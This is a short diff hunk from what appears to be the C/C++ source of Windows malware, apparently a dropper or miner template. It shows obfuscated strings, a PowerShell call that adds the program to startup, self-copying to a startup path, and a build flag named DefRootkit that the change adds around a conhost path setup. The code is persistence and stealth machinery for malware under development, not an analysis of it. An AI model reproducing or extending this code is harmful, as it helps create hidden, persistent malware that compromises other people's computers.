@@ -109,9 +109,10 @@ int wmain(int argc, wchar_t* argv[])
 
     run_program(true, sysdir, powershellPath, AYW_OBFUSCATE(L"%S #STARTUPADD"), powershellPath, startupPath, startupPath, startupPath);
 
+#if DefRootkit
     wchar_t conhostPath[MAX_PATH] = { 0 };
     combine_path(conhostPath, sysdir, AYW_OBFUSCATE(L"#CONHOSTPATH"));
-
+#endif
     if (wcsicmp(exePath, startupPath) != 0) {
         ULONG fileSize;
         PVOID exeFile = read_file(exePath, &fileSize);
